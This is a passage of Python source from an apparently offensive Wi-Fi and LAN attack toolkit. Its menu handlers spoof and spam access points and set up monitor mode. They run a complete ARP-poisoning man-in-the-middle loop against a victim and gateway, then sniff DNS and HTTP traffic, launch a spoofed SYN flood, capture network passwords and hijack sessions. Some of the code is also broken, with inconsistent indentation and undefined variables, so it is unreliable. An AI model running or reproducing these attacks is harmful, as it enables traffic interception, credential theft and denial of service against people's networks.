#		deauthenticate_device(access_point,dev_mac,interface)
	elif(prompt == '5'):
		interface = input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		ap_name = input("SSID (Name of Network): ")
		mac_address_ = input("MAC Address of AP ('r' for random): ")
		if(mac_address_ == 'r'):
			mac_address = str(RandMAC())
		elif(mac_address != 'r'):
			mac_address = str(mac_address_)
		spoof_ap(interface,ap_name,mac_address)
	elif(prompt == '6'):
		interface = input(c.w+str("Supply A Network Interface: "))
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		ap_name = input(c.w+"SSID (Name of Network): ")
		count = input(c.w+"Number of times to Host Network: ")
		spam_ap(interface,ap_name,int(count))
	elif(prompt == '7'):
		interface = input("Network Interface: ")
		dev_ip = input("Target Device Internal IP: ")
		gateway_ip = input("Network Gateway IP: ")
		f = open('/proc/sys/net/ipv4/ip_forward', 'w+')
		f.truncate()
		f.write('1')
		f.close()
		targ_dev_mac = '0'
		targ_dev_ip = '0'
		capt_val = 0
		def resolve_victim_device_info():
			while (capt_val == 0):
				packet = sniff(iface=interface,count=1)
				for pck in packet:
					if(pck.haslayer(IP)):
						if(str(pck.getlayer(IP).src) == str(dev_ip)):
							targ_dev_ip = pck.getlayer(IP).src
							targ_dev_mac = pck.src
							capt_val = 1
							break;
						elif(str(pck.getlayer(IP).dst) == str(dev_ip)):
	        	                                targ_dev_ip = pck.getlayer(IP).dst
	        	                                targ_dev_mac = pck.dst
							capt_val = 1
							break;
		capt_val2 = 0
		gateway_mac = '0'
		gateway_ip = '0'
	#	def resolve_gateway_info():
		gateway_ip = '192.168.1.1'
	       	while (capt_val2 == 0):
			subprocess.Popen(["ping -c 5 "+gateway_ip+" >> /dev/null"], shell=True)
	       	        packet = sniff(iface=interface,count=1)
	       	        for pck in packet:
	       	                if(pck.haslayer(IP)):
	       	                        if(str(pck.getlayer(IP).src) == str(gateway_ip)):
	       	                                gateway_ip = pck.getlayer(IP).src
	       	                                gateway_mac = pck.src
	       	                                capt_val2 = 1
	       	                                break;
	       	                        elif(str(pck.getlayer(IP).dst) == str(gateway_ip)):
	       	                                gateway_ip = pck.getlayer(IP).dst
	       	                                gateway_mac = pck.dst
	       	                                capt_val2 = 1
	       	                                break;
	#	print(c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(targ_dev_mac,targ_dev_ip)
		targ_dev_ip = dev_ip
		gateway_ip = gateway_ip
		try:
			addr_of_dev = reversename.from_address(targ_dev_ip)
			dev_hostname = resolver.query(addr_of_dev, "PTR")[0]
		except:
			dev_hostname = 'unknown'
		print((c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{} "+c.d+"("+c.rb+"{}"+c.d+")").format(targ_dev_ip,dev_hostname))
		print((c.d+"["+c.b+"info"+c.d+"]: Creating Fabricated ARP Packets..."))
		print((c.d+"["+c.b+"info"+c.d+"]: Repeating process for "+c.ob+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(gateway_mac,gateway_ip))
	#	print(c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(gateway_mac,gateway_ip)
		print((c.d+"["+c.b+"info"+c.d+"]: Sending Packets..."))
		print((c.d+"["+c.pb+"*"+c.d+"]: Device Impersonation Successful"))
		victim_arp_packet = ARP(psrc=gateway_ip,pdst=targ_dev_ip)
		gateway_arp_packet = ARP(psrc=targ_dev_ip,pdst=gateway_ip)
		def spcks(pck1,pck2):
			send(pck1,verbose=False,inter=2)
			send(pck2,verbose=False,inter=2)
		threads = []
		while True:
			for i in range(1):
				thread1 = threading.Thread(target=spcks, args=(victim_arp_packet,gateway_arp_packet))
				thread1.setDaemon(True)
				thread1.start()
				threads.append(thread1)
			for thread in threads:
				thread.join()
	elif(prompt == '8'):
		print((c.rb+"NOTE: "+c.w+"This Only works when you are using Option #5 at the same time"))
		interface = input("Network Interface: ")
		ip_address = input("Target IP Address: ")
		dns_traffic(interface,ip_address)
	elif(prompt == '9'):
		print((c.rb+"NOTE: "+c.w+"This Only works when you are using Option #5 at the same time"))
		interface = input("Network Interface: ")
		ip_address = input("Target IP Address: ")
		http_headers(interface,ip_address)
	elif(prompt == '10'):
		interface = input("Network Interface: ")
		ip_source = input("Desired Sender (IP Address to spoof from): ")
		ip_dest = input("Target IP Address: ")
		ip_source_port = 1024
		ip_dest_port = input("Target Port: ")
		#message = raw_input("Message to send in SYN Packet: ")
		message  = "A" * 300
		thread_count = input("Threads: ")
		print((c.w+"["+c.b+"info"+c.w+"]: Setting up..."))
		subprocess.call("service network-manager restart", shell=True)
		time.sleep(5)
		syn_overflow(ip_source,ip_dest,ip_source_port,ip_dest_port,interface,thread_count,message)
	elif(prompt == '11'):
		host = input("Target Host: ")
		start_ = input("Starting Port: ")
		end_ = input("Ending Port: ")
		if(int(start_) < 1):
			print("Error. Starting port must have minimum of 1.")
		if(int(end_) > 65535):
			print("Error. Ending port must have a maximum of 65535.")
		if(int(end_) < 65536 and int(start_) > 0):
			scan_for_ports(host,int(start_),int(end_))
	elif(prompt == '12'):
		interface = input("Network Interface: ")
		network_password_capture(interface)
	elif(prompt == '13'):
		interface = input("Network Interface: ")
		print("Net Range example: 192.168.1.0-255")
		net_range = input("Net Range: ")
		gateway = input("Network gateway: ")
		own_network_traffic(interface,net_range,gateway)
	elif(prompt == '14'):
		interface = input("Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		device = input("Device Mac: ")
		extrapolate_trusted_networks(interface,device)
	elif(prompt == '15'):
		interface = input("Network Interface: ")
		hijack_sessions(interface)
	elif(prompt == '16'):
		compromise_network()
	elif(prompt == '17'):
		interface = input("Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		networks_opprobrium(interface)
	else:
		print("Error. Invalid Option\nType 'help' for available commands")
